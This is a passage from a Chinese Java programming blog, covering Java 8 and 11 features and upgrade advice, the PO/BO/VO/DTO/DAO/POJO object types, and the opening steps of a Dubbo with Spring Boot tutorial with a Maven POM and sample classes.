新的 java.time 包涵盖了所有处理日期，时间，日期 / 时间，时区，时刻（instants），过程（during）与时钟（clock）的操作。</li>
</ol>
<h3 id="base64"><a class="markdownIt-Anchor" href="#base64">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Base64&amp;spm=1001.2101.3001.7020">Base64</a></h3>
<p>在 Java8 中，Base64 编码已经成为 Java 类库的标准。<br>
Java 8 内置了 Base64 编码的编码器和解码器。<br>
Base64 工具类提供了一套静态方法获取下面三种 BASE64 编解码器：</p>
<ol>
<li>基本：输出被映射到一组字符 A-Za-z0-9+/，编码不添加任何行标，输出的解码仅支持 A-Za-z0-9+/。</li>
<li>URL：输出映射到一组字符 A-Za-z0-9+_，输出是 URL 和文件。</li>
<li>MIME：输出隐射到 MIME 友好格式。输出每行不超过 76 字符，并且使用’\r’并跟随’\n’作为分割。编码输出最后没有行分割。</li>
</ol>
<h1 id="二-java11的新特性"><a class="markdownIt-Anchor" href="#二-java11的新特性">#</a> 二、Java11 的新特性</h1>
<h3 id="zgc"><a class="markdownIt-Anchor" href="#zgc">#</a> ZGC</h3>
<p>JDK11 引入了两种新的 GC，其中包括也许是划时代意义的 ZGC，虽然其目前还是实验特性，但是从能力上来看，这是 JDK 的一个巨大突破，为特定生产环境的苛刻需求提供了一个可能的选择。例如，对部分企业核心存储等产品，如果能够保证不超过 10ms 的 GC 暂停，可靠性会上一个大的台阶，这是过去我们进行 GC 调优几乎做不到的，是能与不能的问题。对于 G1 GC，相比于 JDK 8，升级到 JDK 11 即可享受到：并行的 Full GC，快速的 CardTable 扫描，自适应的堆占用比例调整（IHOP），在并发标记阶段的类型卸载等等。这些都是针对 G1 的不断增强，其中串行 Full GC 等甚至是曾经被广泛诟病的短板，你会发现 GC 配置和调优在 JDK11 中越来越方便。</p>
<h3 id="flight-recorderjfr"><a class="markdownIt-Anchor" href="#flight-recorderjfr">#</a> Flight Recorder（JFR）</h3>
<p>Flight Recorder（JFR）是 Oracle 刚刚开源的强大特性。JFR 是一套集成进入 JDK、JVM 内部的事件机制框架，通过良好架构和设计的框架，硬件层面的极致优化，生产环境的广泛验证，它可以做到极致的可靠和低开销。在 SPECjbb2015 等基准测试中，JFR 的性能开销最大不超过 1%，所以，工程师可以基本没有心理负担地在大规模分布式的生产系统使用，这意味着，我们既可以随时主动开启 JFR 进行特定诊断，也可以让系统长期运行 JFR，用以在复杂环境中进行 “After-the-fact” 分析。<br>
在保证低开销的基础上，JFR 提供的能力可以应用在对锁竞争、阻塞、延迟，JVM GC、SafePoint 等领域，进行非常细粒度分析。甚至深入 JIT Compiler 内部，全面把握热点方法、内联、逆优化等等。JFR 提供了标准的 Java、C++ 等扩展 API，可以与各种层面的应用进行定制、集成，为复杂的企业应用栈或者复杂的分布式应用，提供 All-in-One 解决方案。而这一切都是内建在 JDK 和 JVM 内部的，并不需要额外的依赖，开箱即用。</p>
<h3 id="low-overhead-heap-profiling"><a class="markdownIt-Anchor" href="#low-overhead-heap-profiling">#</a> Low-Overhead Heap Profiling</h3>
<p>它来源于 Google 等业界前沿厂商的一线实践，通过获取对象分配细节，为 JDK 补足了对象分配诊断方面的一些短板，工程师可以通过 JVMTI 使用这个能力增强自身的工具。</p>
<h3 id="http2-client-api"><a class="markdownIt-Anchor" href="#http2-client-api">#</a> HTTP/2 Client API</h3>
<p>新的 HTTP API 提供了对 HTTP/2 等业界前沿标准的支持，精简而又友好的 API 接口，与主流开源 API（如，Apache HttpClient， Jetty， OkHttp 等）对等甚至更高的性能。与此同时它是 JDK 在 Reactive-Stream 方面的第一个生产实践，广泛使用了 Java Flow API 等，终于让 Java 标准 HTTP 类库在扩展能力等方面，满足了现代互联网的需求。</p>
<h3 id="transport-layer-security-tls-13"><a class="markdownIt-Anchor" href="#transport-layer-security-tls-13">#</a> Transport <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Layer&amp;spm=1001.2101.3001.7020">Layer</a> Security (TLS) 1.3</h3>
<p>就是安全类库、标准等方面的大范围升级，它还是中国安全专家范学雷所领导的 JDK 项目，完全不同于以往的修修补补，是个非常大规模的工程。<br>
Dynamic Class-File Constants<br>
 动态 class 文件常量。扩展了 Java class 文件格式，支持一种新的常量池形式：CONSTANT_Dynamic。</p>
<h3 id="improve-aarch64-intrinsics"><a class="markdownIt-Anchor" href="#improve-aarch64-intrinsics">#</a> Improve Aarch64 Intrinsics</h3>
<p>主要是针对 ARM Aarch64 架构的优化，比如提供优化的 sin、cos 等函数。</p>
<h3 id="epsilon-a-no-op-garbage-collectorexperimental"><a class="markdownIt-Anchor" href="#epsilon-a-no-op-garbage-collectorexperimental">#</a> Epsilon: A No-Op Garbage Collector(Experimental)</h3>
<p>无操作的垃圾收集器。Epsilon 是一个特殊的垃圾收集器，只处理内存分配，不负责回收。一旦堆耗尽，就关闭 JVM。听上去这个收集器好像没什么意义。不过它还是有不少用处的。比如：性能测试。GC 会影响性能，有了这么一个几乎什么都不干的 GC，我们可以过滤掉 GC 带来的影响因素。还有些性能因素不是 GC 引入的，比如编译器变换，利用 Epsilon GC，我们可以对比。就像生物学里做实验，我们可以用它做一个对照组。另外还有内存压力测试、VM 接口测试等。</p>
<h3 id="launch-single-file-source-code-programs"><a class="markdownIt-Anchor" href="#launch-single-file-source-code-programs">#</a> Launch Single-File Source-Code Programs</h3>
<p>支持运行单个文件中的源代码。在刚学习 Java 或者编写小的工具程序时，我们一般要先用 javac 编译源文件，再用 java 命令运行。有了这个功能，我们可以直接用 java 命令运行源程序。</p>
<h3 id="unicode-10"><a class="markdownIt-Anchor" href="#unicode-10">#</a> Unicode 10</h3>
<p>升级现有 API 支持 Unicode 10。Java SE 10 实现的是 Unicode 8.0。与 Java 10 相比，Java 11 多支持 16 018 个新字符，10 种新的文字类型。</p>
<h3 id="nest-based-access-control"><a class="markdownIt-Anchor" href="#nest-based-access-control">#</a> Nest-Based Access Control</h3>
<p>基于嵌套的访问控制。Java 11 引入了 nest 的概念，这是一个新的访问控制上下文（context），逻辑上处于同一代码实体中的类，尽管会被编译为不同的 class 文件，但是可以访问彼此的 private 成员，不再需要编译器插入辅助访问的桥方法。</p>
<h3 id="dynamic-class-file-constants"><a class="markdownIt-Anchor" href="#dynamic-class-file-constants">#</a> Dynamic Class-File Constants</h3>
<p>动态 class 文件常量。扩展了 Java class 文件格式，支持一种新的常量池形式：CONSTANT_Dynamic。</p>
<h3 id="remove-the-java-ee-and-corba-modules"><a class="markdownIt-Anchor" href="#remove-the-java-ee-and-corba-modules">#</a> Remove the Java EE and CORBA Modules</h3>
<p>将 Java SE 9 中标记为废弃的 Java EE 和 CORBA 正式从 Java SE 平台中删除。</p>
<h3 id="deprecate-the-nashorn-javascript-engine"><a class="markdownIt-Anchor" href="#deprecate-the-nashorn-javascript-engine">#</a> Deprecate the Nashorn JavaScript Engine</h3>
<p>废弃 Nashorn JavaScript 脚本引擎、API 和 jjs 工具。Nashorn 是在 JDK 8 中引入的，当时完整实现了 ECMAScript-262 5.1。不过随着 ECMAScript 的演进加快，Nashorn 维护越来越困难。</p>
<h3 id="deprecate-the-pack200-tools-and-api"><a class="markdownIt-Anchor" href="#deprecate-the-pack200-tools-and-api">#</a> Deprecate the Pack200 Tools and API</h3>
<p>废弃了 pack200 和 unpack200 工具，以及 java.util.jar 包中的 Pack200 API。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h1>
<ol>
<li>G1 GC 平均速度通过 Java 8 切换到 Java 11 就有 16％ 的改进，但是大部分项目都用不到，一些高实时性的游戏可以用；</li>
<li>Java 11 支持源文件直接运行；</li>
<li>已完成项目不建议升级 jdk11，或者新项目需要依赖现有代码，不建议升级 jdk11，因为升级版本涉及到大量的旧代码移植，代码重写，架构重构，全量测试；</li>
<li>如果 jdk8 满足开发需求，并且需依赖现有以 JDK8 开发的代码，建议还是以 jdk8 进行开发，否则如果选用 jdk11 可能面临旧代码重写，架构重构，以及一些不知道的隐形依赖；</li>
<li>系统追求的是稳定并非技术，jdk8 已被广泛验证非常稳定，而且目前主流开发版本确实也是 8，技术还是要服务于业务，稳定大于一切；</li>
<li>从 jdk8 往上升级会出现一些 jar 依赖的改变，模块化带来的反射问题，classload 的变化导致某些问题；</li>
<li>Spring，Spring Boot，Spring Cloud，Dubbo，Guava，Jackson，Tomcat，JUnit 等等项目都适配了 JDK11，并且经历了生产环境的检验，才可以考虑是否将 JDK8 换成 JDK11；</li>
<li>8 之后，商用收费</li>
</ol>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-26T08:51:33.000Z" title="2023/4/26 16:51:33">2023-04-26</time>发表</span><span class="level-item"><time dateTime="2023-04-26T04:59:14.155Z" title="2023/4/26 12:59:14">2023-04-26</time>更新</span><span class="level-item">12 分钟读完 (大约1726个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/26/%E3%80%90Java%E3%80%91%E5%85%B3%E4%BA%8EPO%E3%80%81BO%E3%80%81VO%E3%80%81DTO%E3%80%81DAO%E3%80%81POJO%E7%AD%89%E6%A6%82%E5%BF%B5%E7%9A%84%E7%90%86%E8%A7%A3/">【Java】关于PO、BO、VO、DTO、DAO、POJO等概念的理解</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="java关于po-bo-vo-dto-dao-pojo等概念的理解"><a class="markdownIt-Anchor" href="#java关于po-bo-vo-dto-dao-pojo等概念的理解">#</a> 【Java】关于 PO、BO、VO、DTO、DAO、POJO 等概念的理解</h1>
<h2 id="popersistant-object持久对象"><a class="markdownIt-Anchor" href="#popersistant-object持久对象">#</a> PO（Persistant Object）持久对象</h2>
<p>PO 是持久化对象，用于表示数据库中的一条记录映射成的 Java 对象，类中应该都是基本数据类型和 String，而不是更复杂的类型，因为要和数据库表字段对应。PO 仅仅用于表示数据，不对数据进行操作，拥有 get 和 set 方法。对象类中的属性对应数据库表中的字段，有多少个字段就有多少个属性，完全匹配。遵循 JavaBean 规范，拥有 get 和 set 方法。如下图所示：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725154038992.png" alt="img"></p>
<h2 id="dodata-object数据对象"><a class="markdownIt-Anchor" href="#dodata-object数据对象">#</a> DO（Data Object）数据对象</h2>
<p>数据对象，与数据库表结构一一对应，通过 dao 层向上传输数据对象，属性和 PO 中的基本一致。</p>
<h2 id="aoapplication-object应用对象"><a class="markdownIt-Anchor" href="#aoapplication-object应用对象">#</a> AO（Application Object）应用对象</h2>
<p>在 Web 层与 Service 层之间抽象的复用对象模型，极为贴近展示层，复用度不高。</p>
<h2 id="bobusiness-object业务对象"><a class="markdownIt-Anchor" href="#bobusiness-object业务对象">#</a> BO（Business Object）业务对象</h2>
<p>BO 是实际的业务对象，会参与业务逻辑的处理操作，里面可能会包含多个类，用于表示一个业务对象。例如用户可以拥有宠物，在这里把用户对应一个 PO、宠物对应一个 PO，那么建立一个对应的 BO 对象来处理用户和宠物的关系，每个 BO 都包含用户 PO 和宠物 PO，而处理逻辑时针对 BO 去处理。遵循 JavaBean 规范，拥有 get 和 set 方法。例如：（注：User 和 Pet 都是 PO 对象，但会放进 BO 中，形成一个复杂的业务对象。）</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725155328378.png" alt="img"></p>
<p>但注意，BO 又包括了业务逻辑，通常在 service 层，封装了对 DAO 层的调用，可以进行 PO 与 VO/DTO 之间的转换。</p>
<h2 id="vovalue-object表现对象"><a class="markdownIt-Anchor" href="#vovalue-object表现对象">#</a> VO（Value Object）表现对象</h2>
<p>VO 对象主要用于前端界面显示的数据，是与前端进行交互的 Java 对象，但这里是不用 PO 传递数据的，因为 PO 包括数据库表中的所有字段，对于前端来说我们只需要显示一部分字段就可以了，例如我们的用户表 user 中的 password（密码）字段、phone（电话）字段、insert_time（插入时间）字段是没有必要也不能显示在前端界面的。遵循 JavaBean 规范，拥有 get 和 set 方法。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725155929945.png" alt="img"></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725160415980.png" alt="img"></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725160406410.png" alt="img"></p>
<h2 id="dtodata-transfer-object数据传输对象"><a class="markdownIt-Anchor" href="#dtodata-transfer-object数据传输对象">#</a> DTO（Data Transfer Object）数据传输对象</h2>
<p>数据传输对象是在传递给前端时使用的，如一张表有 100 个字段，那么对应的 PO 就有 100 个属性，但是我们的前端界面只需要显示 10 个字段，所以我们没必要把所有字段的 PO 对象传递到客户端，我们只需要把只有这 10 个属性的 DTO 对象传递到客户端，不会暴露服务端的表结构，到达客户端后，如果这个对象用于界面表示，那么它的身份就是 VO 对象。</p>
<p>DTO 和 VO 概念相似，通常情况下字段也基本一致。但有所不同，DTO 表示一个数据传输对象，是在服务端用于不同服务或不同层之间的数据传输，例如 dao 层到 service 层，service 层到 web 层；而 VO 是在客户端浏览器显示的表现对象，用于在浏览器界面数据的显示。</p>
<h2 id="daodata-access-object数据访问对象"><a class="markdownIt-Anchor" href="#daodata-access-object数据访问对象">#</a> DAO（Data Access Object）数据访问对象</h2>
<p>DAO 是主要封装对数据库的访问，例如 UserDao 封装的就是对 user 表的增删改查操作。</p>
<p>通过它可以把 POJO 持久化为 PO，用 PO 组装出 VO 和 DTO。</p>
<p>DAO 一般在持久层，完全封装数据库操作，对外暴露的方法的使得上层不需要关注数据库的相关信息，只需要插入、删除、更新、查询即可。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/2021072516452423.png" alt="img"></p>
<h2 id="pojoplain-ordinary-java-object简单java对象"><a class="markdownIt-Anchor" href="#pojoplain-ordinary-java-object简单java对象">#</a> POJO（Plain Ordinary Java Object）简单 Java 对象</h2>
<p>表示一个个简单的 Java 对象，而 PO、VO、DTO 都是典型的 POJO，而 DAO 和 BO 一般不是 POJO，只是提供了一些调用方法。</p>
<p>POJO 是 DO、DTO、BO、VO 的统称。</p>
<h2 id="实例"><a class="markdownIt-Anchor" href="#实例">#</a> 实例</h2>
<p>有一个博客系统，数据库中存储了很多篇博客。我们会做如下设计：</p>
<ul>
<li>数据库表：表中的博客包括编号、博客标题、博客内容、博客标签、博客分类、博客状态、创建时间、修改时间等。</li>
<li>PO：包括编号、博客标题、博客内容、博客标签、博客分类、博客状态、创建时间、修改时间等。（与数据库表中的字段一样。）</li>
<li>VO：在客户端浏览器展示的页面数据，博客标题、博客内容、博客标签、博客分类、创建时间、上一篇博客 URL、下一篇博客 URL。</li>
<li>DTO：在服务端数据传输的对象，编号、博客标题、博客内容、博客标签、博客分类、创建时间、上一篇博客编号、下一篇博客编号。</li>
<li>DAO：数据库增删改查的方法，例如新增博客、删除博客、查询所有博客、更新博客。</li>
<li>BO：基本业务操作，如管理分类、管理标签、修改博客状态等，是我们常说的 service 层操作。</li>
</ul>
<p>参考链接：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/uestcyms/article/details/80244407">Java 中常见的对象类型简述 (DO、BO、DTO、VO、AO、PO)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/39651928">PO BO VO DTO POJO DAO DO 这些 Java 中的概念分别指一些什么？</a></li>
</ul>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-26T04:58:33.000Z" title="2023/4/26 12:58:33">2023-04-26</time>发表</span><span class="level-item"><time dateTime="2023-04-26T04:58:08.818Z" title="2023/4/26 12:58:08">2023-04-26</time>更新</span><span class="level-item">11 分钟读完 (大约1659个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/26/%E3%80%90Dubbo%E3%80%91%E4%BD%BF%E7%94%A8Dubbo%E6%95%B4%E5%90%88SpringBoot%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%9C%8D%E5%8A%A1/">【Dubbo】使用Dubbo整合SpringBoot搭建一个服务</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="dubbo使用dubbo整合springboot搭建一个服务"><a class="markdownIt-Anchor" href="#dubbo使用dubbo整合springboot搭建一个服务">#</a> 【Dubbo】使用 Dubbo 整合 SpringBoot 搭建一个服务</h1>
<h3 id="文章目录"><a class="markdownIt-Anchor" href="#文章目录">#</a> 文章目录</h3>
<ul>
<li><a href="#_1">开发前提</a></li>
<li><a href="#Springboot_3">构建 Springboot 项目</a></li>
<li><a href="#api_101">开发 api 模块</a></li>
<li><a href="#_145">开发生产者模块</a></li>
<li>
<ul>
<li><a href="#_147">第一步：导入依赖</a></li>
<li><a href="#_234">第二步：添加配置</a></li>
<li><a href="#_274">第三步：编写启动类</a></li>
<li><a href="#mapper_301">第四步：添加 mapper 接口</a></li>
<li><a href="#_330">第五步：实现接口：</a></li>
<li><a href="#controller_359">第六步：编写 controller 层接口</a></li>
</ul>
</li>
<li><a href="#_389">开发消费者模块</a></li>
<li>
<ul>
<li><a href="#_390">第一步：导入依赖</a></li>
<li><a href="#_433">第二步：添加配置</a></li>
<li><a href="#_451">第三步：编写启动类：</a></li>
<li><a href="#_471">第四步：编写调用生产者接口</a></li>
</ul>
</li>
<li><a href="#_505">测试</a></li>
</ul>
<h1 id="开发前提"><a class="markdownIt-Anchor" href="#开发前提">#</a> 开发前提</h1>
<p>由于 dubbo 的注册中心用的是 zookeeper，所以首先需要<a target="_blank" rel="noopener" href="https://blog.csdn.net/xzkwuli/article/details/120077241">安装 zookeeper</a>。</p>
<h1 id="构建springboot项目"><a class="markdownIt-Anchor" href="#构建springboot项目">#</a> 构建 Springboot 项目</h1>
<p>第一步：选择新建 project 或者 module，在界面中选择 maven 点击 next:<br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/9d940f3148f2466e8baaf9e1ca0ee2da.jpeg" alt="在这里插入图片描述"></p>
<p>第二步：填上项目的基本信息点击 Finish：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/0b67f36ca88c4c39a359cc8702ead495.jpeg" alt="在这里插入图片描述"></p>
<p>第三步：右击项目 new -&gt; Module:</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/96b98e7493684f6982c64e242049a21c.jpeg" alt="在这里插入图片描述"></p>
<p>第四步：在界面中选择 maven 点击 next:</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/8c10cd3965b542bfa3e5a9208359ea6a.jpeg" alt="在这里插入图片描述"></p>
<p>第五步：填上项目的基本信息点击 Finish：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/ab0158e03109413bb7ad0267943b386d.jpeg" alt="在这里插入图片描述"></p>
<p>第六步：重复第三，四，五步，分别创建项目需要的 dubbo-api,dubbo-provider,dubbo-customer 几个模块，如下：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/9739ea601cbf4730b9a1430e6edfdf44.jpeg" alt="在这里插入图片描述"></p>
<p>第七步：导入父工程依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt;</span><br><span class="line">    &lt;packaging&gt;pom&lt;/packaging&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;modules&gt;</span><br><span class="line">        &lt;module&gt;dubbo-provider&lt;/module&gt;</span><br><span class="line">        &lt;module&gt;dubbo-customer&lt;/module&gt;</span><br><span class="line">        &lt;module&gt;dubbo-api&lt;/module&gt;</span><br><span class="line">    &lt;/modules&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">        &lt;source.level&gt;1.8&lt;/source.level&gt;</span><br><span class="line">        &lt;target.level&gt;1.8&lt;/target.level&gt;</span><br><span class="line">        &lt;lombok.version&gt;1.18.16&lt;/lombok.version&gt;</span><br><span class="line">        &lt;skip_maven_deploy&gt;true&lt;/skip_maven_deploy&gt;</span><br><span class="line">        &lt;spring-boot-dependencies.version&gt;2.4.1&lt;/spring-boot-dependencies.version&gt;</span><br><span class="line">        &lt;spring-cloud-dependencies.version&gt;Dalston.SR4&lt;/spring-cloud-dependencies.version&gt;</span><br><span class="line">        &lt;junit.version&gt;4.12&lt;/junit.version&gt;</span><br><span class="line">        &lt;dubbo.version&gt;3.0.2.1&lt;/dubbo.version&gt;</span><br><span class="line">        &lt;spring-dubbo.version&gt;2.0.0&lt;/spring-dubbo.version&gt;</span><br><span class="line">        &lt;lombok.version&gt;1.18.16&lt;/lombok.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencyManagement&gt;</span><br><span class="line">        &lt;dependencies&gt;</span><br><span class="line">            &lt;!-- 统一jar版本管理，避免使用 spring-boot-parent --&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;spring-boot-dependencies.version&#125;&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;dubbo-bom&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;dubbo.version&#125;&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">            &lt;!--dubbo 和  springboot 整合的包--&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;dubbo.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;lombok.version&#125;&lt;/version&gt;</span><br><span class="line">                &lt;scope&gt;compile&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">        &lt;/dependencies&gt;</span><br><span class="line">    &lt;/dependencyManagement&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h1 id="开发api模块"><a class="markdownIt-Anchor" href="#开发api模块">#</a> 开发 api 模块</h1>
<p>user 实体类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.api.entity;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  10:56</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建本次测试的接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.api.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    User <span class="title function_">selectUserById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="开发生产者模块"><a class="markdownIt-Anchor" href="#开发生产者模块">#</a> 开发生产者模块</h1>
<h2 id="第一步导入依赖"><a class="markdownIt-Anchor" href="#第一步导入依赖">#</a> 第一步：导入依赖</h2>
